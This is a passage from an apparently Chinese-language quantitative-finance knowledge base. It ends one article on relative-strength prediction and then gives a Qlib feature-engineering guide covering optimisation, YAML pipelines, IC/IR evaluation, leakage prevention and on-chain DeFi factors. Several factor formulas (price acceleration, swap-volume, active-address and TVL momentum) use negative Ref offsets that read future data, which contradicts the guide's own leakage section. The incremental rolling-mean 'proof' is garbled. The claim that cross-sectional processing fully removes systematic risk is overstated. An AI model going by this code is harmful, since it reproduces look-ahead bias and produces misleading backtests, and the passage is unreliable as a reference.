**Alpha规模**：每年可获得的Alpha约5%-15%\n- **套利机会**：长期存在，但逐渐消失（市场越来越有效）\n\n**结论**：\n- A股市场不是完全有效的，存在Alpha机会\n- 但Alpha机会有限，需要量化方法系统化挖掘\n- 横截面处理是提取Alpha的关键技术\n\n### 5.3 量化思维总结\n\n**核心思想**：\n\n&gt; &quot;我们无法预测市场涨跌，但可以预测相对强弱。&quot;\n\n**三个层次的思维转变**：\n\n**层次1：承认无知**\n\n- 承认自己无法准确预测宏观经济和大盘波动\n- 不赌国运涨跌，不赌行业轮动\n- 只赌&quot;同一环境下，谁比谁强&quot;\n\n**层次2：寻找秩序**\n\n- 相信即便在乱世或盛世，资产之间总有&quot;好坏之分&quot;\n- 通过横截面处理，剔除市场Beta\n- 寻找稳定的Alpha信号\n\n**层次3：纯化信号**\n\n- 通过标准化和中性化，把那些&quot;搭便车&quot;的收益（行业、市值、大盘涨跌）全部扔掉\n- 只捕捉那一点点代表公司真正竞争力的纯Alpha\n- 通过大数定律，分散风险，稳定收益\n\n**量化投资的优势**：\n\n1. **剥离Beta，追求Alpha**：\n   - 绝对预测依赖市场涨跌\n   - 相对预测剥离市场风险\n\n2. **降低预测难度**：\n   - 不需要预测具体价格\n   - 只需要预测相对强弱\n\n3. **提高容错率**：\n   - 不需要绝对精确\n   - 只需要相关性（IC &gt; 0.05）\n\n4. **系统化风险管理**：\n   - 通过分散投资降低特质风险\n   - 通过对冲降低系统性风险\n\n**量化投资的本质**：\n\n量化投资不是&quot;猜大小&quot;，而是：\n- 系统化地挖掘Alpha\n- 科学化地管理风险\n- 工程化地执行交易\n\n横截面标准化不是数学技巧，而是一种投资策略：\n&gt; 我们不赌国运涨跌，也不赌行业轮动，我们只赌&quot;同一环境下，谁比谁强&quot;。\n\n---\n\n## 总结\n\n从&quot;预测绝对价格&quot;到&quot;预测相对强弱&quot;是量化投资思维的核心转变。这个转变不仅是技术层面的，更是哲学层面的质变。\n\n### 核心要点回顾\n\n1. **绝对预测 vs 相对预测**：\n   - 绝对预测：预测价格/收益的绝对值\n   - 相对预测：预测横截面上的相对强弱\n   - 相对预测更稳定、容错率更高\n\n2. **市场噪声过滤**：\n   - 横截面处理可以完全消除系统性风险\n   - 只保留特质收益Alpha和部分噪声\n   - 大大降低预测难度\n\n3. **Alpha/Beta分解**：\n   - 总收益 = Alpha + Beta + Noise\n   - Alpha = 选股能力 + 择时能力 + 执行能力\n   - 横截面处理剥离Beta，只保留Alpha\n\n4. **评估指标**：\n   - IC：因子与未来收益的相关系数\n   - Rank IC：因子排名与收益排名的相关系数\n   - IR：IC的稳定性（均值/标准差）\n\n5. **量化投资哲学**：\n   - 承认无知：无法预测市场涨跌\n   - 寻找秩序：资产之间总有&quot;好坏之分&quot;\n   - 纯化信号：只捕获纯Alpha\n\n### 实践建议\n\n**对于因子研究**：\n- 关注IC和IR，而不是绝对收益\n- 横截面标准化和中性化是必须的\n- 选择稳定的因子（高IR），而不仅仅是高IC\n\n**对于策略构建**：\n- 市场中性：剥离Beta，只赚Alpha\n- 分散投资：通过大数定律降低风险\n- 严格止损：控制下行风险\n\n**对于投资哲学**：\n- 不赌国运，只赌&quot;谁比谁强&quot;\n- 承认市场有效性的局限，但Alpha长期存在\n- 量化投资是科学+工程，不是赌大小\n\n在下一文档中，我们将探讨Qlib特征工程的实践指南，包括特征张量优化、Pipeline配置、因子质量评估、数据泄漏防护等内容。"},"quant/qlib/week1/05-qlib特征工程实践指南":{"slug":"quant/qlib/week1/05-qlib特征工程实践指南","filePath":"quant/qlib/week1/05-qlib特征工程实践指南.md","title":"05-qlib特征工程实践指南","links":[],"tags":[],"content":"Qlib特征工程实践指南\n引言\n前四个文档我们从理论和数学层面深入探讨了Qlib特征工程的核心概念：全景概览、横截面标准化与中性化、Horizon对齐、相对强弱预测的量化思维。\n本文将从实践角度出发，提供完整的Qlib特征工程实践指南，包括特征张量优化、Pipeline配置、因子质量评估、数据泄漏防护，以及链上数据集成的深度实践。\n\n1. 特征张量优化\n1.1 内存优化策略\n数据类型优化\n在量化因子计算中，数据的精度要求通常不高，可以通过降低数据类型来节省内存。\n优化示例：\n# 优化前：float64（8字节）\nimport numpy as np\nfactor = np.random.randn(5000, 1000).astype(&#039;float64&#039;)  # 5000只股票 x 1000天\nmemory = factor.nbytes / 1024**2  # 38.15 MB\n \n# 优化后：float32（4字节）\nfactor = factor.astype(&#039;float32&#039;)\nmemory = factor.nbytes / 1024**2  # 19.07 MB（节省50%）\n时间戳优化：\n# 优化前：datetime64[ns]（8字节）\ndates = pd.date_range(&#039;2020-01-01&#039;, &#039;2023-12-31&#039;)\nmemory = dates.nbytes / 1024**2  # 0.01 MB（小数据不显著）\n \n# 优化后：int64（时间戳）\ntimestamps = dates.astype(&#039;int64&#039;)  # Unix时间戳\nmemory = timestamps.nbytes / 1024**2  # 0.01 MB\n稀疏矩阵应用\n对于稀疏数据（如行业哑变量、指数衰减权重），使用稀疏矩阵可以大幅节省内存。\n示例：行业哑变量\nfrom scipy.sparse import csr_matrix\n \n# 优化前：密集矩阵\nindustry_dummy = np.zeros((5000, 30))  # 5000只股票 x 30个行业\n# 每个股票只属于1个行业，稀疏度约96.7%\nmemory = industry_dummy.nbytes / 1024**2  # 1.14 MB\n \n# 优化后：稀疏矩阵\nrow_indices = [0, 1, 2, ..., 4999]  # 股票索引\ncol_indices = [5, 10, 3, ..., 12]   # 行业索引\ndata = np.ones(5000)\n \nindustry_sparse = csr_matrix((data, (row_indices, col_indices)), shape=(5000, 30))\nmemory = industry_sparse.data.nbytes / 1024**2 + \\\n         industry_sparse.indptr.nbytes / 1024**2 + \\\n         industry_sparse.indices.nbytes / 1024**2  # 0.09 MB（节省92%）\n分片加载\n对于大规模因子库（如10,000个因子，5000只股票，10年数据），分片加载是必要的。\n策略1：按时间分片\n# 将10年数据分成10个年度分片\nyears = [&#039;2020&#039;, &#039;2021&#039;, &#039;2022&#039;, &#039;2023&#039;]\nfor year in years:\n    start_time = f&quot;{year}-01-01&quot;\n    end_time = f&quot;{year}-12-31&quot;\n    factors = D.features(instruments, factor_exprs, start_time, end_time)\n    # 处理当前年度数据\n策略2：按资产分片\n# 将5000只股票分成10个分片\nchunks = list(range(0, 5000, 500))  # [0, 500, 1000, ..., 4500]\nfor i in range(len(chunks)-1):\n    start_idx = chunks[i]\n    end_idx = chunks[i+1]\n    chunk_instruments = instruments[start_idx:end_idx]\n    factors = D.features(chunk_instruments, factor_exprs, start_time, end_time)\n    # 处理当前分片数据\n1.2 计算优化\n向量化操作\n避免使用for循环，使用numpy/pandas的向量化操作。\n慢示例：\n# 慢：for循环\ndef slow_rolling_mean(data, window):\n    result = np.zeros_like(data)\n    for i in range(window, len(data)):\n        result[i] = data[i-window:i].mean()\n    return result\n \n%timeit slow_rolling_mean(price, 20)\n# 输出：100 ms ± 5 ms per loop (mean ± std. dev. of 7 runs, 10 loops each)\n快示例：\n# 快：向量化\ndef fast_rolling_mean(data, window):\n    return data.rolling(window).mean()\n \n%timeit fast_rolling_mean(price, 20)\n# 输出：1 ms ± 0.1 ms per loop (mean ± std. dev. of 7 runs, 1000 loops each)\n并行化\n对于大规模因子计算，使用多进程并行化。\n示例：\nfrom multiprocessing import Pool\n \ndef compute_factor(args):\n    stock_id, start_time, end_time = args\n    # 计算单个股票的因子\n    factor = D.features([stock_id], [factor_expr], start_time, end_time)\n    return factor\n \n# 串行（慢）\nfor stock_id in instruments:\n    factor = compute_factor((stock_id, start_time, end_time))\n \n# 并行（快）\nargs = [(stock_id, start_time, end_time) for stock_id in instruments]\nwith Pool(8) as p:  # 8个进程\n    results = p.map(compute_factor, args)\n滚动窗口优化\n对于滚动窗口计算，使用增量计算避免重复计算。\n慢示例：\n# 慢：每次重新计算\ndef slow_rolling_incremental(data, window):\n    result = np.zeros_like(data)\n    for i in range(window, len(data)):\n        result[i] = data[i-window:i].mean()  # 重复计算\n    return result\n快示例：\n# 快：增量计算\ndef fast_rolling_incremental(data, window):\n    result = np.zeros_like(data)\n    # 计算第一个窗口\n    result[window-1] = data[:window].mean()\n \n    # 增量更新\n    for i in range(window, len(data)):\n        # 减去离开窗口的值，加上进入窗口的值\n        result[i] = result[i-1] + (data[i] - data[i-window]) / window\n \n    return result\n \n# 证明正确性\n# result[i] = result[i-1] + (data[i] - data[i-window]) / window\n# = mean(data[i-window:i-1]) + (data[i] - data[i-window]) / window\n# = (sum(data[i-window:i-1]) + data[i] - data[i-window]) / window\n# = sum(data[i-window+1:i]) / window\n# = mean(data[i-window+1:i+1])\n# = mean(data[i-window+1:i])  # 下一轮的窗口\n1.3 大规模因子库管理\n存储方案\n方案1：HDF5\n适合中小规模因子库（10K因子）。\nimport h5py\n \n# 创建HDF5文件\nwith h5py.File(&#039;factor_library.h5&#039;, &#039;w&#039;) as f:\n    # 创建数据集\n    f.create_dataset(&#039;factor1&#039;, data=factor1, compression=&#039;gzip&#039;)\n    f.create_dataset(&#039;factor2&#039;, data=factor2, compression=&#039;gzip&#039;)\n \n    # 创建属性\n    f[&#039;factor1&#039;].attrs[&#039;name&#039;] = &#039;momentum_20&#039;\n    f[&#039;factor1&#039;].attrs[&#039;ic_mean&#039;] = 0.05\n    f[&#039;factor1&#039;].attrs[&#039;ir&#039;] = 1.2\n \n# 读取因子\nwith h5py.File(&#039;factor_library.h5&#039;, &#039;r&#039;) as f:\n    factor1 = f[&#039;factor1&#039;][:]\n    ic_mean = f[&#039;factor1&#039;].attrs[&#039;ic_mean&#039;]\n方案2：Parquet\n适合大规模因子库（100K+因子）。\nimport pyarrow.parquet as pq\nimport pandas as pd\n \n# 保存因子（Parquet格式）\nfactor_df = pd.DataFrame({\n    &#039;date&#039;: dates,\n    &#039;instrument&#039;: instruments,\n    &#039;factor1&#039;: factor1,\n    &#039;factor2&#039;: factor2\n})\nfactor_df.to_parquet(&#039;factor_library.parquet&#039;, engine=&#039;pyarrow&#039;)\n \n# 读取因子\nfactor_df = pd.read_parquet(&#039;factor_library.parquet&#039;)\n索引策略\n复合索引：\n# 设置复合索引\nfactor_df.set_index([&#039;date&#039;, &#039;instrument&#039;], inplace=True)\n \n# 快速查询\nfactor = factor_df.loc[&#039;2023-01-01&#039;, &#039;000001.SZ&#039;]\nB树索引：\n# 对于HDF5\nwith h5py.File(&#039;factor_library.h5&#039;, &#039;a&#039;) as f:\n    # 创建软链接作为索引\n    f.create_dataset(&#039;date_index&#039;, data=dates)\n    f.create_dataset(&#039;instrument_index&#039;, data=instruments)\n\n2. Pipeline配置模板\n2.1 基础模板：行情因子\n# config/baseline.yaml\n \n# 数据源\ndata:\n  provider: &quot;qlib.data.LocalFileProvider&quot;\n  uri: &quot;data/qlib/qlib_data/cn_data&quot;\n  region: &quot;cn&quot;\n \n# 因子定义\nfactors:\n  - name: &quot;ma_5&quot;\n    expr: &quot;Mean($close, 5)&quot;\n    description: &quot;5日均线&quot;\n \n  - name: &quot;ma_20&quot;\n    expr: &quot;Mean($close, 20)&quot;\n    description: &quot;20日均线&quot;\n \n  - name: &quot;momentum_10&quot;\n    expr: &quot;($close / Ref($close, 10)) - 1&quot;\n    description: &quot;10日动量&quot;\n \n# 标签\nlabel:\n  expr: &quot;Ref($close, -5) / $close - 1&quot;\n  horizon: 5\n  description: &quot;未来5日收益率&quot;\n \n# 标准化\nnormalization:\n  type: &quot;zscore&quot;\n  axis: &quot;cross_section&quot;\n \n# 回测配置\nbacktest:\n  start_time: &quot;2020-01-01&quot;\n  end_time: &quot;2023-12-31&quot;\n  rebalance_freq: &quot;5d&quot;\n  top_k: 100  # 选Top 100只股票\n2.2 进阶模板：多因子组合\n# config/advanced.yaml\n \n# 数据源\ndata:\n  provider: &quot;qlib.data.LocalFileProvider&quot;\n  uri: &quot;data/qlib/qlib_data/cn_data&quot;\n \n# 因子定义\nfactors:\n  # 技术因子\n  - name: &quot;rsi_14&quot;\n    expr: &quot;RSI($close, 14)&quot;\n    category: &quot;technical&quot;\n \n  - name: &quot;boll_upper&quot;\n    expr: &quot;Mean($close, 20) + 2 * Std($close, 20)&quot;\n    category: &quot;technical&quot;\n \n  - name: &quot;boll_lower&quot;\n    expr: &quot;Mean($close, 20) - 2 * Std($close, 20)&quot;\n    category: &quot;technical&quot;\n \n  # 动量因子\n  - name: &quot;momentum_20&quot;\n    expr: &quot;($close / Ref($close, 20)) - 1&quot;\n    category: &quot;momentum&quot;\n \n  - name: &quot;price_acceleration&quot;\n    expr: &quot;Ref($close, -1) / $close - Ref($close, -20) / Ref($close, -21)&quot;\n    category: &quot;momentum&quot;\n \n  # 波动因子\n  - name: &quot;volatility_20&quot;\n    expr: &quot;Std($close, 20) / Mean($close, 20)&quot;\n    category: &quot;volatility&quot;\n \n  - name: &quot;atr_14&quot;\n    expr: &quot;ATR($high, $low, $close, 14)&quot;\n    category: &quot;volatility&quot;\n \n  # 流动性因子\n  - name: &quot;turnover_rate&quot;\n    expr: &quot;$turnover&quot;\n    category: &quot;liquidity&quot;\n \n  - name: &quot;volume_ratio&quot;\n    expr: &quot;$volume / Mean($volume, 20)&quot;\n    category: &quot;liquidity&quot;\n \n# 因子组合\ncombination:\n  method: &quot;ic_weighted&quot;  # IC加权\n  weights: &quot;auto&quot;  # 自动学习\n  min_ic: 0.03  # 最小IC阈值\n \n# 中性化\nneutralization:\n  - &quot;industry&quot;  # 行业中性\n  - &quot;market_cap&quot;  # 市值中性\n \n# 标准化\nnormalization:\n  type: &quot;zscore&quot;\n  axis: &quot;cross_section&quot;\n  method: &quot;robust&quot;  # 鲁棒标准化（对异常值不敏感）\n \n# 回测配置\nbacktest:\n  start_time: &quot;2020-01-01&quot;\n  end_time: &quot;2023-12-31&quot;\n  rebalance_freq: &quot;5d&quot;\n  top_k: 50\n  max_weight: 0.02  # 单只股票最大权重2%\n\n3. 因子质量评估流程\n3.1 IC/IR分析流程\ndef evaluate_factor(factor_name, start_date, end_date, horizon=5):\n    &quot;&quot;&quot;\n    评估因子的IC/IR\n    &quot;&quot;&quot;\n    # 1. 加载数据\n    factor = load_factor(factor_name, start_date, end_date)\n    price = load_price(start_date, end_date)\n \n    # 2. 计算收益率\n    returns = price.pct_change(horizon).shift(-horizon)\n \n    # 3. 对齐数据\n    data = pd.DataFrame({\n        &#039;factor&#039;: factor,\n        &#039;return&#039;: returns\n    }).dropna()\n \n    # 4. 计算IC序列\n    ic_series = []\n    for date in data.index.get_level_values(&#039;date&#039;).unique():\n        subset = data.loc[date]\n        ic = subset[&#039;factor&#039;].corr(subset[&#039;return&#039;])\n        ic_series.append(ic)\n \n    ic_series = pd.Series(ic_series)\n \n    # 5. 统计指标\n    ic_mean = ic_series.mean()\n    ic_std = ic_series.std()\n    ir = ic_mean / ic_std if ic_std &gt; 0 else 0\n \n    # 6. IC显著性检验\n    n = len(data.loc[date])  # 横截面股票数\n    t_stat = ic_mean * np.sqrt(n / (1 - ic_mean**2))\n    p_value = 2 * (1 - t.cdf(abs(t_stat), df=n-2))\n \n    # 7. 分组回测\n    quintile_returns = quintile_backtest(data, n_groups=5)\n \n    return {\n        &#039;ic_mean&#039;: ic_mean,\n        &#039;ic_std&#039;: ic_std,\n        &#039;ir&#039;: ir,\n        &#039;t_stat&#039;: t_stat,\n        &#039;p_value&#039;: p_value,\n        &#039;quintile_returns&#039;: quintile_returns\n    }\n3.2 衰减周期测试\ndef decay_analysis(factor_name, max_horizon=60):\n    &quot;&quot;&quot;\n    测试因子在不同Horizon下的IC\n    &quot;&quot;&quot;\n    ic_by_horizon = []\n \n    for h in range(1, max_horizon+1):\n        ic = compute_ic(factor_name, horizon=h)\n        ic_by_horizon.append(ic)\n \n    # 找到最大IC的Horizon\n    best_h = np.argmax(ic_by_horizon) + 1\n \n    # 计算衰减率\n    decay_rate = compute_decay_rate(ic_by_horizon)\n \n    return {\n        &#039;ic_by_horizon&#039;: ic_by_horizon,\n        &#039;best_horizon&#039;: best_h,\n        &#039;decay_rate&#039;: decay_rate\n    }\n \ndef compute_decay_rate(ic_series, threshold=0.5):\n    &quot;&quot;&quot;\n    计算衰减率：IC从最大值衰减到50%所需的时间\n    &quot;&quot;&quot;\n    max_ic = max(ic_series)\n    half_max_ic = max_ic * threshold\n \n    for i, ic in enumerate(ic_series):\n        if ic &lt; half_max_ic:\n            return i + 1  # 返回衰减到50%所需的Horizon\n \n    return len(ic_series)  # 如果没有衰减到50%，返回总长度\n3.3 相关性矩阵与去重\ndef factor_correlation_analysis(factor_list, threshold=0.9):\n    &quot;&quot;&quot;\n    因子相关性分析与去重\n    &quot;&quot;&quot;\n    # 计算相关系数矩阵\n    corr_matrix = pd.DataFrame(index=factor_list, columns=factor_list)\n \n    for i, f1 in enumerate(factor_list):\n        for j, f2 in enumerate(factor_list):\n            if i &lt;= j:\n                corr = compute_correlation(f1, f2)\n                corr_matrix.loc[f1, f2] = corr\n                corr_matrix.loc[f2, f1] = corr\n \n    # 层次聚类去重\n    from scipy.cluster.hierarchy import linkage, fcluster\n    from scipy.spatial.distance import squareform\n \n    # 将相关系数转换为距离\n    distance_matrix = 1 - corr_matrix.values\n    distance_vector = squareform(distance_matrix)\n \n    # 层次聚类\n    Z = linkage(distance_vector, method=&#039;average&#039;)\n    clusters = fcluster(Z, t=threshold, criterion=&#039;distance&#039;)\n \n    # 每个聚类选择IC最高的因子\n    cluster_dict = {}\n    for i, cluster_id in enumerate(clusters):\n        if cluster_id not in cluster_dict:\n            cluster_dict[cluster_id] = []\n        cluster_dict[cluster_id].append(factor_list[i])\n \n    selected_factors = []\n    for cluster_id, factors in cluster_dict.items():\n        best_factor = max(factors, key=lambda f: get_ic(f))\n        selected_factors.append(best_factor)\n \n    return {\n        &#039;selected_factors&#039;: selected_factors,\n        &#039;corr_matrix&#039;: corr_matrix,\n        &#039;clusters&#039;: cluster_dict\n    }\n\n4. 数据泄漏防护\n4.1 常见泄漏场景\n场景1：未来数据泄露\n# 错误：计算t时刻的波动率，使用了未来数据\ndef wrong_volatility(price, window):\n    result = np.zeros_like(price)\n    for i in range(len(price)):\n        result[i] = price[i:i+window].std()  # 包含i+1到i+window-1的数据\n    return result\n \n# 正确：只使用历史数据\ndef correct_volatility(price, window):\n    result = np.zeros_like(price)\n    for i in range(window-1, len(price)):\n        result[i] = price[i-window+1:i+1].std()  # 只使用i-window+1到i的数据\n    return result\n \n# 更优：使用Qlib的Rolling算子\ndef qlib_volatility():\n    return Expression(Std($close, 20))  # Qlib自动处理时序\n场景2：样本外信息混入\n# 错误：在整个数据集上标准化\ndef wrong_standardization(X_train, X_test):\n    X_all = np.concatenate([X_train, X_test], axis=0)\n    scaler = StandardScaler().fit(X_all)  # 使用了测试集信息\n    X_train_scaled = scaler.transform(X_train)\n    X_test_scaled = scaler.transform(X_test)\n    return X_train_scaled, X_test_scaled\n \n# 正确：只在训练集上标准化\ndef correct_standardization(X_train, X_test):\n    scaler = StandardScaler().fit(X_train)  # 只使用训练集信息\n    X_train_scaled = scaler.transform(X_train)\n    X_test_scaled = scaler.transform(X_test)\n    return X_train_scaled, X_test_scaled\n4.2 检测方法\ndef detect_lookahead_bias(factor_df, price_df, horizon=5):\n    &quot;&quot;&quot;\n    检测Look-ahead Bias\n    &quot;&quot;&quot;\n    # 方法1：检查因子是否与未来价格相关\n    lookahead_corr = []\n \n    for lag in [-1, -2, -5, -10]:\n        shifted_factor = factor_df.shift(lag)\n        corr = shifted_factor.corrwith(price_df)\n        lookahead_corr.append(corr)\n \n    # 如果shift(-1)相关性显著 &gt; IC，说明有泄漏\n    ic_mean = compute_ic(factor_df, price_df, horizon=horizon)\n    if lookahead_corr[0].mean() &gt; 2 * ic_mean:\n        warn(&quot;Potential lookahead bias detected!&quot;)\n        return False\n \n    # 方法2：检查因子分布突变\n    factor_diff = factor_df.diff().abs()\n    threshold = factor_diff.std() * 5\n    if (factor_diff &gt; threshold).any():\n        warn(&quot;Factor has extreme jumps, check for data leaks!&quot;)\n        return False\n \n    return True\n4.3 最佳实践清单\n\n 因子计算只用历史数据（t 时刻的因子只用 &lt;t 的数据）\n 标签使用shift(-h)对齐（将未来收益对齐到当前时刻）\n 测试集严格在训练集之后（时间序列划分）\n 避免使用未来统计量（Rolling、Lag算子）\n 定期进行泄漏检测（detect_lookahead_bias）\n 审计日志记录每一步操作\n 样本外严格验证（不使用样本内信息调参）\n\n\n5. 链上数据集成\n5.1 链上数据特征工程挑战\n与传统的金融数据相比，链上数据有以下独特挑战：\n挑战1：数据频率极高\n\n区块链交易是7×24小时实时发生的\n数据频率可能达到秒级甚至毫秒级\n传统Qlib框架主要用于日频数据，需要适配\n\n挑战2：数据维度复杂\n\nToken级别（类似股票代码）\n地址级别（用户行为）\n协议级别（DeFi生态）\n交易级别（逐笔分析）\n\n挑战3：数据质量参差不齐\n\n部分数据缺失（如隐私币、跨链桥）\n数据清洗困难（Sybil攻击、女巫攻击）\n数据来源多样（RPC、The Graph、Dune Analytics）\n\n挑战4：链上链下融合\n\n需要将链上数据与链下数据融合\n时间戳对齐困难（区块链时间 vs 现实时间）\n不同链的数据格式不统一\n\n5.2 DeFi数据映射到Qlib（Token级别）\nToken级别的数据映射\n将Token视为”股票”，链上指标视为”因子”：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nQlib概念链上概念示例股票代码Token地址或SymbolETH, BTC, UNI, AAVE行业链Ethereum, BSC, Polygon市值Token市值Market Cap成交量交易量Volume价格DEX价格Price from Uniswap\nDEX Swap行为因子\n因子1：Swap Volume Momentum（交易量动量）\n# Qlib Expression伪代码\nswap_momentum = (\n    Ref($swap_volume, -5) / $swap_volume - 1\n)\n金融含义：\n\n如果交易量在5天内增长了50%，说明市场关注度高\n动量因子通常为正，说明未来可能继续上涨\n\n因子2：Price Velocity（价格变化速率）\n# Qlib Expression伪代码\nprice_velocity = (\n    ($price / Ref($price, 1)) - 1\n) / sqrt(1 + $gas_price)  # 归一化Gas成本\n金融含义：\n\n价格变化速率考虑了Gas成本（交易成本）\n如果价格涨了10%，但Gas成本很高，实际净收益可能很低\n\n因子3：Liquidity Depth（流动性深度）\n# Qlib Expression伪代码\nliquidity_depth = (\n    $liquidity_0side + $liquidity_1side\n) / $price\n金融含义：\n\n流动性深度越大，滑点越小，交易成本越低\n流动性深度是DeFi协议健康度的重要指标\n\n因子4：Slippage Ratio（滑点比率）\n# Qlib Expression伪代码\nslippage = (\n    ($price - $twap_price) / $twap_price\n) * $trade_size\n金融含义：\n\n滑点比率衡量大额交易对价格的影响\n滑点大说明流动性差，不适合大额交易\n\n5.3 链上指标集成（地址级别→聚合）\n地址级别的因子\n因子1：Daily Active Addresses（DAA）动量\n# Qlib Expression伪代码\ndaa_momentum = (\n    Ref($daily_active_addresses, -7) /\n    $daily_active_addresses - 1\n)\n金融含义：\n\n活跃地址数7天内增长了50%，说明用户参与度高\nDAA是网络效应的重要指标\n\n因子2：Transaction Velocity（交易活跃度）\n# Qlib Expression伪代码\ntx_velocity = (\n    $transaction_count / $total_addresses\n)\n金融含义：\n\n每个地址的平均交易次数\n交易活跃度高说明Token流通性好\n\n因子3：Whale Activity（大户活动）\n# Qlib Expression伪代码\nwhale_activity = (\n    sum($transaction_size where $transaction_size &gt; 1000 ETH) /\n    $total_volume\n)\n金融含义：\n\n大户（Whale）交易占比\n大户活动多可能是”聪明钱”进场\n\n5.4 协议级别因子\n因子1：TVL（Total Value Locked）增长\n# Qlib Expression伪代码\ntvl_growth = (\n    Ref($protocol_tvl, -30) / $protocol_tvl - 1\n)\n金融含义：\n\nTVL 30天内增长了50%，说明协议发展迅速\nTVL是DeFi协议健康度的核心指标\n\n因子2：Staking APY（质押收益率）\n# Qlib Expression伪代码\napy_factor = (\n    $staking_apy / $risk_free_rate\n)\n金融含义：\n\n质押收益率相对于无风险收益率的倍数\nAPY高说明协议激励性强，可能吸引更多用户\n\n5.5 交易级别因子（高频分析）\n因子1：Order Book Imbalance（订单簿失衡）\n# Qlib Expression伪代码\norder_book_imbalance = (\n    ($bid_volume - $ask_volume) /\n    ($bid_volume + $ask_volume)\n)\n金融含义：\n\n订单簿失衡=1表示全是买单，= -1表示全是卖单\n订单簿失衡大说明市场情绪强（买方或卖方压倒性优势）\n\n因子2：Trade Size Distribution（交易规模分布）\n# Qlib Expression伪代码\nwhale_ratio = (\n    sum($trade_size where $trade_size &gt; 1000 ETH) /\n    $total_volume\n)\n金融含义：\n\n大额交易占比\n大额交易多可能是”聪明钱”或”鲸鱼”活动\n\n5.6 链上-传统数据融合\n融合案例1：CEX-DEX套利因子\n# Qlib Expression伪代码\n# 交易所价差\nexchange_spread = (\n    abs($cex_price - $dex_price) / $dex_price\n)\n \n# 套利信号（考虑流动性）\narbitrage_signal = (\n    exchange_spread *\n    min($cex_liquidity, $dex_liquidity) /  # 流动性限制\n    (1 + $gas_price)  # Gas成本\n)\n金融含义：\n\nCEX和DEX价差大，说明有套利机会\n但需要考虑流动性限制和Gas成本\n如果价差=5%，但Gas成本=2%，净套利收益=3%\n\n融合案例2：On-chain Momentum + Off-chain Volume\n# Qlib Expression伪代码\n# 混合动量因子\nhybrid_momentum = (\n    0.6 * ($on_chain_return) +\n    0.4 * ($off_chain_volume / Ref($off_chain_volume, -1))\n)\n金融含义：\n\n链上收益占60%，链下成交量占40%\n结合链上和链下信息，提高因子稳定性\n\n融合案例3：Cross-chain Arbitrage（跨链套利）\n# Qlib Expression伪代码\n# 跨链价差\nchain_spread = (\n    abs($eth_chain_price - $bsc_chain_price) /\n    $eth_chain_price\n)\n \n# 跨桥时间\nbridge_time = ($block_time_target - $block_time_source)\n \n# 跨桥费用\nbridge_fee = $bridge_gas * $gas_price\n \n# 套利收益\narbitrage_profit = (\n    chain_spread -\n    bridge_fee / $trade_size -  # 跨桥费用\n    bridge_time * $time_decay  # 时间衰减\n)\n金融含义：\n\n跨链价差大，说明有套利机会\n但需要考虑跨桥时间、跨桥费用\n如果价差=10%，但跨桥费用=5%，跨桥时间=10小时（时间衰减=2%），净套利收益=3%\n\n5.7 链上数据集成实践总结\n链上数据集成的三个层次：\n层次1：Token级别（类似股票）\n\n将Token映射为”股票代码”\n链上指标映射为”因子”\n适合传统量化框架\n\n层次2：地址级别（用户行为）\n\n将地址行为聚合为Token级别因子\n关注大户、活跃地址、交易活跃度\n适合用户行为分析\n\n层次3：协议级别（DeFi生态）\n\n将协议指标映射为”行业因子”\n关注TVL、APY、使用率\n适合DeFi生态分析\n\n链上数据集成的四个维度：\n维度1：Token级别（资产维度）\n\n价格、市值、成交量\nDEX Swap行为\n跨链套利机会\n\n维度2：地址级别（用户维度）\n\n活跃地址数\n大户活动\n用户留存率\n\n维度3：协议级别（生态维度）\n\nTVL增长\nAPY激励\n使用率\n\n维度4：交易级别（微观维度）\n\n订单簿失衡\n交易规模分布\n滑点分析\n\n链上数据融合的三个方向：\n方向1：链上-链下融合\n\nCEX-DEX价差\n链上收益 + 链下成交量\n跨链套利\n\n方向2：多链融合\n\nEthereum + BSC + Polygon\n跨链价差\n跨链流动性\n\n方向3：链上-链上融合\n\nToken价格 + 流动性\nDEX Swap + 链上指标\n协议TVL + APY\n\n\n6. 完整项目模板\n6.1 目录结构\nqlib-factor-project/\n├── config/                    # 配置文件\n│   ├── baseline.yaml         # 基础模板\n│   ├── advanced.yaml         # 进阶模板\n│   └── on_chain.yaml         # 链上数据模板\n├── data/                      # 数据目录\n│   ├── qlib_data/            # Qlib数据\n│   └── on_chain_data/        # 链上数据\n├── factors/                   # 因子定义\n│   ├── expressions.py        # Qlib表达式\n│   ├── on_chain_factors.py   # 链上因子\n│   └── traditional_factors.py # 传统因子\n├── evaluation/                # 评估模块\n│   ├── ic_analysis.py        # IC分析\n│   ├── backtest.py           # 回测\n│   └── report.py             # 报告生成\n├── utils/                     # 工具函数\n│   ├── data_loader.py        # 数据加载\n│   ├── normalization.py      # 标准化\n│   └── leakage_detector.py   # 泄漏检测\n├── logs/                      # 日志目录\n└── main.py                   # 主程序\n\n6.2 主程序模板\n# main.py\n \nfrom qlib import init\nfrom factors.expressions import load_traditional_factors\nfrom factors.on_chain_factors import load_on_chain_factors\nfrom evaluation.ic_analysis import evaluate_all_factors\nfrom evaluation.report import generate_report\n \ndef main():\n    # 1. 初始化Qlib\n    init(provider_uri=&quot;data/qlib/qlib_data/cn_data&quot;)\n \n    # 2. 加载传统因子\n    traditional_factors = load_traditional_factors(\n        config_path=&quot;config/advanced.yaml&quot;\n    )\n \n    # 3. 加载链上因子\n    on_chain_factors = load_on_chain_factors(\n        tokens=[&quot;ETH&quot;, &quot;BTC&quot;, &quot;UNI&quot;, &quot;AAVE&quot;],\n        config_path=&quot;config/on_chain.yaml&quot;\n    )\n \n    # 4. 合并因子\n    all_factors = {**traditional_factors, **on_chain_factors}\n \n    # 5. 评估因子\n    results = evaluate_all_factors(\n        factors=all_factors,\n        start_time=&quot;2020-01-01&quot;,\n        end_time=&quot;2023-12-31&quot;\n    )\n \n    # 6. 生成报告\n    generate_report(results, output_path=&quot;logs/factor_report.html&quot;)\n \n    print(&quot;Factor evaluation completed!&quot;)\n \nif __name__ == &quot;__main__&quot;:\n    main()\n6.3 配置文件模板\n# config/on_chain.yaml\n \n# 数据源\ndata:\n  on_chain:\n    source: &quot;dune_api&quot;  # 或 &quot;the_graph&quot;, &quot;custom_rpc&quot;\n    chains: [&quot;ethereum&quot;, &quot;bsc&quot;, &quot;polygon&quot;]\n    tokens: [&quot;ETH&quot;, &quot;BTC&quot;, &quot;UNI&quot;, &quot;AAVE&quot;, &quot;LINK&quot;]\n \n  metrics:\n    # Token级别\n    - name: &quot;swap_volume&quot;\n      type: &quot;token_level&quot;\n      frequency: &quot;1d&quot;\n 